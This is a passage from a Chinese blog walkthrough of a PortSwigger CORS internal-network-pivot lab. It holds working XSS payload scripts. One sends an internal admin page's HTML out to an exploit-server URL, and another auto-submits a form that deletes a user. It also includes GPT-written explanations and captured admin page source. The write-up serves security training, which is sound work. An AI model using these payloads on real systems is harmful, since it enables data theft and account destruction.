<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">代码解析：GPT回答<br>解析：<br><br>1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。<br><br>2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。<br><br>3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。<br><br>4.定义了一个 fetchUrl(url, collaboratorURL) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。<br><br>5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。<br><br>6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。<br><br>7.调用 fetchUrl 函数，传递目标 URL 和协作者 URL 作为参数，以发起异步请求并触发 XSS 攻击。<br><br>这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。<br></code></pre></td></tr></table></figure>
<p>现在我们将探测用户名字段中的XSS漏洞。</p>
<p class='item-img' data-src='image-20230512093905416.png'><img src="image-20230512093905416.png" alt="image-20230512093905416"></p>
<p>检索URL中具有foundXSS=1的Collaborator交互；或者在日志中看到foundXSS=1</p>
<p class='item-img' data-src='image-20230512094256644.png'><img src="image-20230512094256644.png" alt="image-20230512094256644"></p>
<p>part3:</p>
<p>重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为与步骤2中相同的IP地址和端口号，再次添加Collaborator有效负载或漏洞利用服务器。更新并提供漏洞利用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">xss</span>(<span class="hljs-params">url, text, vector</span>) &#123;<br>	location = url + <span class="hljs-string">&#x27;/login?time=&#x27;</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()+<span class="hljs-string">&#x27;&amp;username=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(vector)+<span class="hljs-string">&#x27;&amp;password=test&amp;csrf=&#x27;</span>+text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf&quot; value=&quot;([^&quot;]+)&quot;/</span>)[<span class="hljs-number">1</span>];<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url, collaboratorURL</span>)&#123;<br>	<span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span>=&gt;</span><br>	&#123;<br>		<span class="hljs-title function_">xss</span>(url, text, <span class="hljs-string">&#x27;&quot;&gt;&lt;iframe src=/admin onload=&quot;new Image().src=\&#x27;&#x27;</span>+collaboratorURL+<span class="hljs-string">&#x27;?code=\&#x27;+encodeURIComponent(this.contentWindow.document.body.innerHTML)&quot;&gt;&#x27;</span>);<br>	&#125;<br>	))<br>&#125;<br> <br><span class="hljs-title function_">fetchUrl</span>(<span class="hljs-string">&quot;http://192.168.0.175:8080&quot;</span>, <span class="hljs-string">&quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230512094430574.png'><img src="image-20230512094430574.png" alt="image-20230512094430574"></p>
<p>Collaborator交互或利用服务器日志会提供管理页面的源代码</p>
<p class='item-img' data-src='image-20230512094539843.png'><img src="image-20230512094539843.png" alt="image-20230512094539843"></p>
<p>part4：</p>
<p>检索源代码，会注意到有一个允许删除用户的表单。重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为相同的IP地址和端口号。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//  源代码</span><br> &lt;script src=<span class="hljs-string">&quot;/resources/labheader/js/labHeader.js&quot;</span>&gt;&lt;/script&gt;<br>            <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;academyLabHeader&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;academyLabBanner&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;logo&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title-container&quot;</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>CORS vulnerability with internal network pivot attack<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exploit-link&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net&quot;</span>&gt;</span>Go to exploit server<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;link-back&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack&quot;</span>&gt;</span></span><br><span class="language-xml">                        Back<span class="hljs-symbol">&amp;nbsp;</span>to<span class="hljs-symbol">&amp;nbsp;</span>lab<span class="hljs-symbol">&amp;nbsp;</span>description<span class="hljs-symbol">&amp;nbsp;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.1&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Layer_1&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;0px&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;0px&quot;</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">&quot;0 0 28 30&quot;</span> <span class="hljs-attr">enable-background</span>=<span class="hljs-string">&quot;new 0 0 28 30&quot;</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;back-arrow&quot;</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">g</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">points</span>=<span class="hljs-string">&quot;1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">polygon</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">points</span>=<span class="hljs-string">&quot;14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">polygon</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;/<span class="hljs-name">g</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;widgetcontainer-lab-status is-notsolved&quot;</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>LAB<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Not solved<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lab-status-icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    <br><br>        &lt;div theme=&quot;&quot;&gt;<br>            &lt;section class=&quot;maincontainer&quot;&gt;<br>                &lt;div class=&quot;container is-page&quot;&gt;<br>                    &lt;header class=&quot;navigation-header&quot;&gt;<br>                        &lt;section class=&quot;top-links&quot;&gt;<br>                            &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;<br>                            &lt;a href=&quot;/admin&quot;&gt;Admin panel&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;<br>                            &lt;a href=&quot;/my-account?id=administrator&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;<br>                        &lt;/section&gt;<br>                    &lt;/header&gt;<br>                    &lt;header class=&quot;notification-header&quot;&gt;<br>                    &lt;/header&gt;<br>                    &lt;form style=&quot;margin-top: 1em&quot; class=&quot;login-form&quot; action=&quot;/admin/delete&quot; method=&quot;POST&quot;&gt;<br>                        &lt;input required=&quot;&quot; type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;Mn2Dj8wVciUoD89vrl36Io4lkfpFQQG0&quot;&gt;<br>                        &lt;label&gt;Username&lt;/label&gt;<br>                        &lt;input required=&quot;&quot; type=&quot;text&quot; name=&quot;username&quot;&gt;<br>                        &lt;button class=&quot;button&quot; type=&quot;submit&quot;&gt;Delete user&lt;/button&gt;<br>                    &lt;/form&gt;<br>                &lt;/div&gt;<br>            &lt;/section&gt;<br>        &lt;/div&gt;<br>    <br><br> HTTP/1.1&quot; 200 &quot;User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&quot;<br></code></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//  脚本</span><br>&lt;script&gt;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">xss</span>(<span class="hljs-params">url, text, vector</span>) &#123;<br>	location = url + <span class="hljs-string">&#x27;/login?time=&#x27;</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()+<span class="hljs-string">&#x27;&amp;username=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(vector)+<span class="hljs-string">&#x27;&amp;password=test&amp;csrf=&#x27;</span>+text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf&quot; value=&quot;([^&quot;]+)&quot;/</span>)[<span class="hljs-number">1</span>];<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url</span>)&#123;<br>	<span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span>=&gt;</span><br>	&#123;<br>	<span class="hljs-title function_">xss</span>(url, text, <span class="hljs-string">&#x27;&quot;&gt;&lt;iframe src=/admin onload=&quot;var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\&#x27;carlos\&#x27;,f.submit()&quot;&gt;&#x27;</span>);<br>	&#125;<br>	))<br>&#125;<br> <br><span class="hljs-title function_">fetchUrl</span>(<span class="hljs-string">&quot;http://192.168.0.175:8080&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">代码解析：GPT回答<br>解析：<br><br>1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。<br><br>2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。<br><br>3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。<br><br>4.定义了一个 fetchUrl(url) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。<br><br>5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。<br><br>6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。<br><br>7.在构造恶意向量时，使用了一个包含 &lt;iframe&gt; 元素的恶意 XSS 脚本代码。该 &lt;iframe&gt; 元素的 src 属性设置为 /admin，并在加载完成时触发一个 JavaScript 代码，该代码会找到目标页面中的表单，将用户名字段（如果存在）设置为 &#x27;carlos&#x27;，然后自动提交表单。<br><br>8.调用 fetchUrl 函数，传递目标 URL 作为参数，以发起异步请求并触发 XSS 攻击。<br><br>这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230512094948032.png'><img src="image-20230512094948032.png" alt="image-20230512094948032"></p>
<p>代码通过注入一个指向/admin页面的iframe提交表单以删除carlos</p>
<p class='item-img' data-src='image-20230512095046927.png'><img src="image-20230512095046927.png" alt="image-20230512095046927"></p>
<p>详情参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/27/disabled_button/">← Next 攻防世界-disabled_button</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/26/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/">ssrf漏洞总结 Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">CORS跨域漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9C%BA%E6%99%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">跨域访问的一些场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">跨域请求方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CORS%E8%B7%A8%E5%9F%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 CORS跨域原理及漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CORS%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 CORS漏洞攻击流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%BF%AE%E5%A4%8D%E5%8F%8A%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 修复及防御方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 简单请求的示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E6%8A%80%E5%B7%A7"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 漏洞发现技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80-BurpSuite"><span class="toc-number">1.7.0.0.1.</span> <span class="toc-text">方式一: BurpSuite</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C-Access-Control-Allow-Origin%EF%BC%9A"><span class="toc-number">1.7.0.0.2.</span> <span class="toc-text">方式二: Access-Control-Allow-Origin：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%89-%E4%BD%BF%E7%94%A8CORScanner%E5%B7%A5%E5%85%B7-%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F"><span class="toc-number">1.7.0.0.3.</span> <span class="toc-text">方式三: 使用CORScanner工具(漏洞自动化扫描)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E5%85%B6%E4%BB%96%E5%8F%AF%E8%83%BD%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 其他可能利用漏洞的地方</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-1-%E8%A7%A3%E6%9E%90Origin%E5%A4%B4%E6%97%B6%E5%87%BA%E9%94%99"><span class="toc-number">1.8.0.1.</span> <span class="toc-text">8.1 解析Origin头时出错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-2-%E5%88%A9%E7%94%A8%E7%9B%B8%E4%BA%92%E5%8F%97CORS%E4%BF%A1%E4%BB%BB%E7%9A%84%E5%9F%9F%E6%9D%A5%E8%BF%9B%E8%A1%8CXSS"><span class="toc-number">1.8.0.2.</span> <span class="toc-text">8.2 利用相互受CORS信任的域来进行XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-%E7%99%BD%E5%90%8D%E5%8D%95%E4%B8%AD%E7%9A%84null%E5%80%BC"><span class="toc-number">1.8.0.3.</span> <span class="toc-text">8.3 白名单中的null值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-%E5%88%A9%E7%94%A8CORS%E6%BC%8F%E6%B4%9E-%E5%81%8F%E5%AE%9E%E9%99%85%E7%8E%AF%E5%A2%83"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 利用CORS漏洞(偏实际环境)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9A%E5%AD%98%E5%9C%A8%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81"><span class="toc-number">1.9.0.1.</span> <span class="toc-text">方式一：存在用户凭证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-bp%E5%AE%98%E7%BD%91%E7%9A%84%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0"><span class="toc-number">1.10.</span> <span class="toc-text">0x12 bp官网的靶场练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80-%E5%85%B7%E6%9C%89%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%82%B9%E5%8F%8D%E5%B0%84%E7%9A%84-CORS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.10.0.1.</span> <span class="toc-text">实验一: 具有基本原点反射的 CORS 漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%AE%A4%E4%BA%8C%EF%BC%9A%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%A9%BA%E6%BA%90%E7%9A%84CORS%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.10.0.2.</span> <span class="toc-text">实验室二：受信任空源的CORS漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%89-%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%9A%84CORS%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.10.0.3.</span> <span class="toc-text">实验三:  受信任的不安全协议的CORS漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%9B%9B-CORS%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E6%9E%A2%E8%BD%B4%E6%94%BB%E5%87%BB"><span class="toc-number">1.10.0.4.</span> <span class="toc-text">实验四: CORS漏洞与内部网络枢轴攻击</span></a></li></ol></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>